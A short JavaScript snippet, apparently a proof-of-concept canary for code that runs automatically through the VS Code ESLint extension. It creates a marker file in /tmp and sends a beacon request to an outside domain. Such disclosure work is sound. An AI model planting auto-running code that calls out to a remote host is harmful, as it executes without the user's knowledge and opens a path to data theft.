const fs = require('fs');const filename = '/tmp/hifromvscode-eslint';fs.closeSync(fs.openSync(filename, 'w'));const https = require('https');https.get('https://daviddworken.com/hifromvscode-eslint')
/**
